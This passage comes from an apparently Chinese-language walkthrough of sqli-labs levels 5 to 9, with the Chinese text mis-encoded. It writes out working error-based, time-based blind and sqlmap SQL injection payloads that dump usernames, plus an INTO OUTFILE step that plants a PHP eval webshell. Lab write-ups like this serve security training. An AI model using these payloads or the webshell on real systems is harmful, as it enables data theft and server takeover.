sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007738.png"></p><ul><li><code>select group_concat(table_name) ...</code><ul><li><code>group_concat()</code>ï¼šå°†å¤šè¡Œç»“æœåˆå¹¶ä¸ºå•ä¸ªå­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ <code>users,emails,products</code>ï¼‰ã€‚</li><li><code>information_schema.tables</code>ï¼šç³»ç»Ÿè¡¨ï¼Œå­˜å‚¨æ‰€æœ‰æ•°æ®åº“çš„è¡¨ä¿¡æ¯ã€‚</li><li><code>where table_schema=&#39;security&#39;</code>ï¼šç­›é€‰å±äº <code>security</code> æ•°æ®åº“çš„è¡¨ã€‚</li></ul></li><li><strong>æŠ¥é”™ä¿¡æ¯æ³„éœ²</strong><br>æŠ¥é”™ä¿¡æ¯ä¸­ä¼šåŒ…å«æ‰€æœ‰è¡¨åçš„æ‹¼æ¥ç»“æœï¼ˆå¦‚ <code>users,emails,...</code>ï¼‰ã€‚</li></ul><p>å¾—åˆ°å­—æ®µå</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007739.png"></p><ul><li><code>information_schema.columns</code><br>ç³»ç»Ÿè¡¨ï¼Œå­˜å‚¨æ‰€æœ‰è¡¨çš„åˆ—ï¼ˆå­—æ®µï¼‰ä¿¡æ¯ã€‚</li><li><code>where table_name=&#39;users&#39;</code><br>ç­›é€‰ <code>users</code> è¡¨çš„å­—æ®µåï¼ˆå¦‚ <code>id,username,password</code>ï¼‰ã€‚</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(username) from users)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007226.png"></p><p>ç”¨ç¿»è¯‘è½¯ä»¶ç¿»è¯‘å‡ºæ¥çš„æ„æ€æ˜¯[å­æŸ¥è¯¢è¿”å›è¶…è¿‡ 1 è¡Œ]ï¼Œæ‰€ä»¥ç”¨countå‡½æ•°ç»Ÿè®¡çœ‹çœ‹æœ‰å¤šå°‘æ•°æ®</p><p><strong>é”™è¯¯æç¤º</strong>ï¼š<code>å­æŸ¥è¯¢è¿”å›è¶…è¿‡ 1 è¡Œ</code><br><code>group_concat(username)</code> ä¼šå°†æ‰€æœ‰ <code>username</code> åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆå¦‚ <code>admin,user1,user2</code>ï¼‰ï¼Œä½†ç”±äºæŸäº›ç¯å¢ƒé™åˆ¶ï¼ˆå¦‚ MySQL ç‰ˆæœ¬æˆ–é…ç½®ï¼‰ï¼Œè¿‡é•¿çš„å­—ç¬¦ä¸²å¯èƒ½å¯¼è‡´æŠ¥é”™ä¿¡æ¯æˆªæ–­æˆ–æ— æ³•è§¦å‘é¢„æœŸé”™è¯¯ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select count(username) from users)))--+</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°usernameæœ‰13ä¸ªï¼Œæ—¢ç„¶è¾“å‡ºä¸€è¡Œï¼Œé‚£ä¹ˆç”¨limitä¸€ä¸ªä¸€ä¸ªè¾“å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007166.png"></p><ul><li><code>count(username)</code><br>ç»Ÿè®¡ <code>users</code> è¡¨ä¸­ <code>username</code> çš„æ•°é‡ï¼ˆå¦‚ <code>13</code>ï¼‰ï¼Œé¿å…è¿”å›å¤šè¡Œæ•°æ®ã€‚</li><li><strong>ä½œç”¨</strong>ï¼šç¡®å®šéœ€è¦åˆ†é¡µè·å–æ•°æ®çš„æ€»é‡ã€‚</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 0,1)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007609.png"></p><p>å¾—åˆ°ç¬¬ä¸€ä¸ªç”¨æˆ·è´¦æˆ·</p><ul><li><code>limit 0,1</code><br>é™åˆ¶å­æŸ¥è¯¢è¿”å›ä¸€è¡Œæ•°æ®ï¼ˆ<code>0</code> è¡¨ç¤ºèµ·å§‹ä½ç½®ï¼Œ<code>1</code> è¡¨ç¤ºæ•°é‡ï¼‰ã€‚</li><li><strong>é€æ­¥éå†</strong><br>ä¿®æ”¹ <code>limit 1,1</code>ã€<code>limit 2,1</code> ç­‰è·å–åç»­æ•°æ®ã€‚</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 1,1)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007530.png"></p><p>å¾—åˆ°ç¬¬äºŒä¸ªç”¨æˆ·è´¦æˆ·</p><p>ä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ°æ‰€æœ‰è´¦æˆ·å¯†ç </p><p>2.updatexmlæŠ¥é”™<br>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,database(),0x7e),1)â€“+</p><p>å¾—åˆ°æ•°æ®åº“åç§°</p><p>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)â€“+</p><p>å¾—åˆ°æ•°æ®è¡¨åç§°</p><p>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;â€™usersâ€™),0x7e),1)â€“+</p><p>å¾—åˆ°å­—æ®µåç§°</p><p>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)â€“+</p><p>å¾—åˆ°ç”¨æˆ·å</p><p>3.extractvalueæŠ¥é”™<br>?id&#x3D;1â€™ and extractvalue(1,concat(0x23,database(),0x23))â€“+</p><p>å¾—åˆ°æ•°æ®åº“åç§°</p><p>?id&#x3D;1â€™ and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x23))â€“+</p><p>å¾—åˆ°æ•°æ®è¡¨åç§°</p><p>å¾—åˆ°å­—æ®µåç§°</p><p>?id&#x3D;1â€™ and extractvalue(1,concat(0x23,(select group_concat(username) from users),0x23))â€“+</p><p>å¾—åˆ°ç”¨æˆ·åç§°ï¼Œä½†æ˜æ˜¾å¯ä»¥çœ‹å‡ºï¼Œè¿˜æ²¡æ˜¾ç¤ºå®Œæ•´ï¼Œç”¨limité€ä¸ªæŸ¥çœ‹</p><p>?id&#x3D;1â€™ and extractvalue(1,concat(0x23,(select username from users limit 0,1),0x23))â€“+</p><p>æŸ¥çœ‹ç¬¬ä¸€ä¸ªè´¦æˆ·åç§°</p><h4 id="Less-6-å•å¼•å·å­—ç¬¦å‹-å¸ƒå°”ç›²æ³¨-æŠ¥é”™æ³¨å…¥"><a href="#Less-6-å•å¼•å·å­—ç¬¦å‹-å¸ƒå°”ç›²æ³¨-æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-6-å•å¼•å·å­—ç¬¦å‹_å¸ƒå°”ç›²æ³¨_æŠ¥é”™æ³¨å…¥"></a>Less-6-å•å¼•å·å­—ç¬¦å‹_å¸ƒå°”ç›²æ³¨_æŠ¥é”™æ³¨å…¥</h4><p>è¿™ä¸€å…³ä¸less-5çš„åŒºåˆ«åœ¨äºæ³¨å…¥ç‚¹ä¸åŒï¼Œless-5æ˜¯å•å¼•å·ï¼Œless-6æ˜¯åŒå¼•å·ï¼Œå…¶ä»–çš„éƒ½ä¸€æ ·ï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨ï¼Œä¹Ÿå¯ä»¥ç”¨updatexmlæŠ¥é”™æ³¨å…¥ã€‚</p><p>å…ˆåˆ¤æ–­å‡ºæ³¨å…¥ç‚¹æ˜¯åŒå¼•å·</p><p>?id&#x3D;1â€  and updatexml(1,concat(0x7e,database(),0x7e),1)â€“+</p><p>å¾—åˆ°æ•°æ®åº“åç§°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008410.png"></p><p>?id&#x3D;1â€  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)â€“+</p><p>å¾—åˆ°æ•°æ®è¡¨åç§°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008470.png"></p><p>?id&#x3D;1â€  and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€™securityâ€™ and table_name&#x3D;â€™usersâ€™)),1) â€“+</p><p>å¾—åˆ°å­—æ®µåç§°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008950.png"></p><p>?id&#x3D;1â€ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)â€“+<br>å¾—åˆ°ç”¨æˆ·å</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008893.png"></p><p>ç”±äºç»“æœæ˜¾ç¤ºä¸å…¨ å¯ä»¥ä½¿ç”¨limitæ¥é€ä¸ªæŸ¥è¯¢</p><p>?id&#x3D;1â€ and updatexml(1,concat(1,(select username from users limit 0,1) ),1) â€“+</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008212.png"></p><h4 id="Less-7-å•å¼•å·-åŒæ‹¬å·-outfileå‡½æ•°"><a href="#Less-7-å•å¼•å·-åŒæ‹¬å·-outfileå‡½æ•°" class="headerlink" title="Less-7-å•å¼•å·+åŒæ‹¬å·_outfileå‡½æ•°"></a>Less-7-å•å¼•å·+åŒæ‹¬å·_outfileå‡½æ•°</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009634.png"></p><p>ç»è¿‡è¯•éªŒï¼Œé—­åˆæ–¹å¼æ˜¯å­—ç¬¦å‹<code>&#39;))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009623.png"></p><p>æ­£å¸¸è¿”å› <code>You are in.... Use outfile...... </code> é”™è¯¯è¿”å› <code>You have an error in your SQL syntax</code></p><p><a href="https://blog.csdn.net/JCY1009015337/article/details/53038104?ops_request_misc=%7B%22request_id%22:%22e4c27b101ddef8d9f30b7bae6e7ea27b%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=e4c27b101ddef8d9f30b7bae6e7ea27b&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-53038104-null-null.142%5Ev102%5Epc_search_result_base7&utm_term=outfile&spm=1018.2226.3001.4187">Mysqlä¹‹outfile_mysql outfile-CSDNåšå®¢</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) order by 3 --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009298.png"></p><h5 id="æ–¹æ³•ä¸€ï¼šoutfileå¯¼å‡ºæ–‡ä»¶"><a href="#æ–¹æ³•ä¸€ï¼šoutfileå¯¼å‡ºæ–‡ä»¶" class="headerlink" title="æ–¹æ³•ä¸€ï¼šoutfileå¯¼å‡ºæ–‡ä»¶"></a>æ–¹æ³•ä¸€ï¼šoutfileå¯¼å‡ºæ–‡ä»¶</h5><p>åœ¨less7ä¸­ï¼Œå› ä¸ºå®ƒæŠ¥é”™ä¸è¿”å›æŠ¥é”™çš„æ•°æ®åº“ä¿¡æ¯ï¼Œæˆ‘ä»¬æ— æ³•è·å–åˆ°ç½‘ç«™è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨1-6å…³ä¸­æ³¨å…¥è·å¾—æ•°æ®åº“è·¯å¾„ï¼Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,@@datadir --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009327.png"></p><p><code>@@datadir</code>è¿”å›çš„æ˜¯æ•°æ®åº“å­˜å‚¨æ•°æ®çš„è·¯å¾„ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ç½‘ç«™è·¯å¾„æ˜¯åœ¨<code>WWW</code>ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆç»“åˆ<code>@@datadir</code>æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºç½‘ç«™çš„ç»å¯¹è·¯å¾„ä¸º <code>D:\CTF-Tools\phpstudy_pro\WWW\</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) and (select count(*) from mysql.user)&gt;0 --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009701.png"></p><p>è¿”å›æ­£å¸¸åˆ™æœ‰è¯»å–æƒé™</p><p>æ¨¡æ¿ï¼š<code>?id=1&#39;)) union select (sqlè¯­å¥) into outfile &#39;è·¯å¾„&#39; --+</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,2,3 into outfile &#x27;</span>D:\\CTF<span class="hljs-operator">-</span>Tools\\phpstudy_pro\\WWW\\sqli<span class="hljs-operator">-</span>labs\\Less<span class="hljs-number">-7</span>\\<span class="hljs-number">1.</span>txt<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>å†™å…¥å¤±è´¥ï¼Œä¹‹åæ‰¾åˆ°é—®é¢˜æ˜¯æƒé™è¿‡ä½ï¼Œéœ€è¦æ‰“å¼€<code>phpstudy\MySQL\my.ini</code>æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åŠ ä¸Šä¸€å¥ï¼š<code>secure_file_priv=&quot;/&quot;</code></p><p><code>D:\CTF-Tools\phpstudy_pro\Extensions\MySQL5.7.26\my.ini</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009595.png"></p><p>å·²ç»ç”Ÿæˆäº†<code>1.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009239.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022010650.png"></p><p>å†™ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,2,&#x27;</span><span class="hljs-operator">&lt;</span>?php <span class="hljs-variable">@eval</span>($_POST[&quot;admin&quot;])?<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27; into outfile &quot;D:\\CTF-Tools\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php&quot; --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022010904.png"></p><p>èšå‰‘è¿æ¥æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011888.png"></p><p><strong>æ³¨æ„</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/song123sh/article/details/123724719?ops_request_misc=%7B%22request_id%22:%22795b77a816914f9f51d9a3bc6abeeca1%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=795b77a816914f9f51d9a3bc6abeeca1&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-123724719-null-null.142%5Ev102%5Epc_search_result_base7&utm_term=sqli-labsless7&spm=1018.2226.3001.4187">sqlilabsâ€”less7_less-7-CSDNåšå®¢</a></p><p>å¯¹æ–‡ä»¶è¿›è¡Œå¯¼å…¥å¯¼å‡ºé¦–å…ˆå¾—è¦æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œä½†æ˜¯mysqlé»˜è®¤ä¸èƒ½å¯¼å…¥å’Œå¯¼å‡ºæ–‡ä»¶ï¼Œè¿™ä¸<code>secure_file_priv</code>çš„å€¼æœ‰å…³ï¼ˆé»˜è®¤ä¸ºnull)ã€‚<code>secure-file-priv</code>å‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚<br>1ã€å½“secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º<br>2ã€å½“secure_file_privçš„å€¼ä¸º&#x2F;tmp&#x2F; ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹<br>3ã€å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶<br>ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹secure_file_privçš„å€¼</p><p><code>show variables like â€˜%secure%â€™ï¼›</code></p><p>ç”±äºå…ˆå‰å·²åšè¿‡ä¿®æ”¹ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯å¯å¯¼å…¥å¯¼å‡º</p><p>å¦‚æœæ˜¯nullï¼Œæƒ³å¾—åˆ°å¯¼å…¥å¯¼å‡ºæƒé™ï¼Œå¯ä»¥åœ¨my.iniæ–‡ä»¶[mysqld]çš„åé¢åŠ ä¸Šsecure_file_priv&#x3D;â€™â€™ï¼ˆä¸¤ä¸ªè‹±æ–‡å•å¼•å·ï¼‰ï¼Œç„¶åé‡å¯phpstudyå³å¯</p><p>1ã€outfire åé¢çš„è·¯å¾„ä¸ºç»å¯¹è·¯å¾„ä¸”å­˜åœ¨<br>2ã€è¦æœ‰è¶³å¤Ÿçš„æƒé™<br>3ã€æ³¨å…¥çš„å†…å®¹ä¹Ÿå¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œå¥å­<br>4ã€è¦æƒ³æ³¨å…¥æ–°å†…å®¹ï¼Œéœ€è¦æ–°çš„æ–‡ä»¶å</p><p>è¿™é‡Œå†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åˆ©ç”¨æ•°æ®åº“fileæƒé™å‘æ“ä½œç³»ç»Ÿå†™å…¥æ–‡ä»¶æ—¶ï¼Œå¯¹äºç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ä¸èƒ½è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœç¬¬ä¸€æ¬¡ä¸Šä¼ 1.phpï¼Œä¸‹æ¬¡å†ä¸Šä¼ 1.phpï¼Œå°±æ˜¯æ— æ•ˆå‘½ä»¤äº†ï¼Œä¹Ÿå°±æ˜¯æ–°çš„test.phpä¸­çš„å†…å®¹å¹¶ä¸ä¼šè¦†ç›–ä¹‹å‰çš„1.php</p><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>åŸºæœ¬ä¸Šå’Œless-5ä¸€æ ·</p><p><a href="https://www.cnblogs.com/wuhongbin/p/15582981.html">è‡ªåŠ¨åŒ–SQLæ³¨å…¥æµ‹è¯•å·¥å…· sqlmap ä½¿ç”¨æ‰‹å†Œ - FreeK0x00 - åšå®¢å›­</a></p><p><a href="https://blog.csdn.net/shanguicsdn111/article/details/142088764">SQLmapä½¿ç”¨æ•™ç¨‹å›¾æ–‡æ•™ç¨‹ï¼ˆéå¸¸è¯¦ç»†ï¼‰ä»é›¶åŸºç¡€å…¥é—¨åˆ°ç²¾é€šï¼Œçœ‹å®Œè¿™ä¸€ç¯‡å°±å¤Ÿäº†ã€‚-CSDNåšå®¢</a></p><p><code>-u</code>[url]</p><p><code>-D</code>[æ•°æ®åº“]</p><p><code>-T</code>[è¡¨]</p><p><code>-C</code>[å­—æ®µ]</p><p><code>--dbs</code>[åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“]</p><p><code>--tables</code>[åˆ—å‡ºæ•°æ®åº“æ‰€æœ‰è¡¨]</p><p><code>--dump</code>[å¯¼å‡ºè¡¨çš„æ•°æ®]</p><p><code>--batch</code>[è‡ªåŠ¨é€‰æ‹©é»˜è®¤é€‰é¡¹ï¼ˆé¿å…äº¤äº’å¼æé—®ï¼‰]</p><p>è¿™é‡Œä½¿ç”¨sqlmap</p><p>python sqlmap.py -u <a href="http://sqli-labs:8080/Less-9/?id=1">http://sqli-labs:8080/Less-9/?id=1</a> â€“batch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011477.png"></p><p>è¿”å›çš„æ³¨å…¥ç‚¹æœ‰å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨</p><p>æ•°æ®åº“æ˜¯Mysql</p><p>æ¥ä¸‹æ¥çˆ†æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1 --dbs<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011729.png"></p><p>æŸ¥çœ‹<code>security</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -D security --tables<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011341.png"></p><p>æŸ¥çœ‹<code>users</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -T users --dump<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011299.png"></p><h4 id="Less-9-å•å¼•å·-æ—¶é—´ç›²æ³¨"><a href="#Less-9-å•å¼•å·-æ—¶é—´ç›²æ³¨" class="headerlink" title="Less-9-å•å¼•å·-æ—¶é—´ç›²æ³¨"></a>Less-9-å•å¼•å·-æ—¶é—´ç›²æ³¨</h4><p>python sqlmap.py -u <a href="http://sqli-labs:8080/Less-9/?id=1">http://sqli-labs:8080/Less-9/?id=1</a> â€“current-db â€“batch</p><p>æ— è®ºidç­‰äºå¤šå°‘éƒ½æ˜¾ç¤º<code>You are in ....</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1<br>?id=1&#x27;<br>?id=1&quot;<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸€å…³ç”¨åˆ°çš„æ˜¯æ—¶é—´ç›²æ³¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27; and sleep(3) --+<br></code></pre></td></tr></table></figure><p>å½“ä¼ å…¥ä¸Šé¢çš„è¯­å¥æ—¶ï¼Œé¡µé¢å»¶è¿Ÿäº†ä¸‰ç§’ï¼Œç¡®å®šä¸ºå•å¼•å·</p><h5 id="æ—¶é—´ç›²æ³¨æ­¥éª¤ï¼š"><a href="#æ—¶é—´ç›²æ³¨æ­¥éª¤ï¼š" class="headerlink" title="æ—¶é—´ç›²æ³¨æ­¥éª¤ï¼š"></a>æ—¶é—´ç›²æ³¨æ­¥éª¤ï¼š</h5><h6 id="è·å–æ•°æ®åº“å"><a href="#è·å–æ•°æ®åº“å" class="headerlink" title="è·å–æ•°æ®åº“å"></a><strong>è·å–æ•°æ®åº“å</strong></h6><p>1.1 çŒœè§£æ•°æ®åº“åé•¿åº¦è¯­æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length(database())=x,sleep(5),1)--+</span><br><span class="hljs-string">/*é€šè¿‡å˜æ¢ x çš„å€¼æ¥ç¡®å®šæ•°æ®åº“åçš„é•¿åº¦ï¼Œå¾—åˆ°æ•°æ®åº“åçš„é•¿åº¦ä¸º8ã€‚*/</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(leng(database())=8,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure><p>1.2 çŒœæµ‹æ•°æ®åº“ï¼š<br>è¯­æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),x,1))=y, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•ç¬¬ä¸€ä½ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>æµ‹å¾—ç¬¬ä¸€ä½æ˜¯ s</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),2,1))=101, sleep(5), 1)--+</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç¬¬äºŒä½æ˜¯ eï¼ˆascii ç æ˜¯ 101ï¼‰â€¦ ä»¥æ­¤ç±»æ¨ï¼ŒçŸ¥é“äº†æ•°æ®åº“åæ˜¯ <strong>security</strong></p><h6 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a><strong>è·å–è¡¨å</strong></h6><p>2.1 çŒœè§£è¡¨çš„æ•°é‡</p><figure class="highlight 